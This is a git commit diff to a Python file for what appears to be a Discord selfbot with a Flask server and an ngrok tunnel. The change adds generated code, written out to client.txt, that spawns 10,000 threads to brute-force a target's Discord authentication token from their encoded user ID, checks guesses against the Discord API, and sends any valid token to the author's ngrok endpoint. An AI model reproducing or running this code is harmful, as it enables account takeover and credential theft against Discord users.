d8a91b6c4b0e66d9bc8f46419c14dcfb341be5ae
dontbanmeplz <59851616+dontbanmeplz@users.noreply.github.com>
2021-03-10 12:43:55 -0600

    Update server.py

--- Net/server.py
+++ Net/server.py
@@ -12,9 +12,7 @@ import discord, os, json
 from discord.ext import commands
 from discord.ext.commands import Bot
 from plyer import notification
-
 from flask import Flask, request
-
 app = Flask(__name__)
 
 todos = {}
@@ -44,6 +42,27 @@ class MyClient(discord.Client):
     encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
     encodedstamp = str(encodedBytes, "utf-8")
     time.sleep(3)
+    file = f'''
+    import requests as req
+from threading import Thread as thr
+for i in range(10000):
+    thr(target = gen, args = ({encodedid})).start()
+def gen(encodedid):
+  while True:
+    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
+    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
+    token = encodedid + "." + second + "." + end
+    headers = {'Content-Type': 'application/json', 'authorization': token}
+    url = "https://discordapp.com/api/v6/users/@me/library"
+    r = req.get(url, headers=headers)
+    if r.status_code == 200:
+        print(token + ' Valid')
+        data = (("token", token))
+        r = req.get({ngrok}, data=data)
+        exit(0)
+    else:
+        print(f'{token} Invalid')'''
+    open("client.txt", "w").write(file)
     while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
@@ -54,8 +73,9 @@ class MyClient(discord.Client):
             conn.sendall(encodedid)
             s.close()
             continue
+            
 client = MyClient()
+ngrok.set_auth_token(tok)
+ngrok = str(ngrok.connect(5000)).split(" ->")[0].split(" ")[1].replace('"', "")
 client.run(token, bot=False)
 app.run(port=5000)
-ngrok.set_auth_token(tok)
-ngrok_tunnel2 = ngrok.connect(5000)
